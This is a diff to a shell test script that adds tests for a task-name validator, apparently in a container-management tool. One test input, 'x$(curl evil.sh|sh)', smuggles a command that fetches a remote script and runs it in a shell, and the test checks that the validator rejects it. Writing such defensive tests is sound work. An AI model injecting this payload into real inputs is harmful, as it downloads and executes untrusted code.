@@ -55,6 +55,21 @@ else
   PASS=$((PASS + 1))
 fi
 
+# --- validate_task_name ---
+if validate_task_name 'my-task_1.2' 2>/dev/null; then
+  PASS=$((PASS + 1))
+else
+  FAIL=$((FAIL + 1))
+  echo "FAIL: valid task-name rejected"
+fi
+
+if validate_task_name 'x$(curl evil.sh|sh)' 2>/dev/null; then
+  FAIL=$((FAIL + 1))
+  echo "FAIL: task-name with shell metacharacters accepted"
+else
+  PASS=$((PASS + 1))
+fi
+
 # --- discovery / collision helpers: structural (they call lxc) ---
 assert_contains 'user.forge.repo'
 assert_contains 'user.forge.mode'
